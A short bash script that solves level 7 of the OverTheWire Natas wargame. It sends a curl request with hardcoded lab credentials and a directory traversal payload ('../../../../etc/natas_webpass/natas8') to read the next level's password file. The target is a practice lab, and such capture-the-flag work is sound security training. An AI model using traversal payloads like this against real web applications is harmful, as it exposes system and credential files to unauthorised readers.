#!/bin/bash

# This challenge tells us the location of the password in the Filesystem
# there are links to home page which is ?page=home
# use directory treversal to read the file

USER=natas7
PASS='bmg8SvU1LizuWjx3y7xkNERkHxGre0GS'

curl -fsSL -u $USER:$PASS \
  http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8 | grep -B 2 password
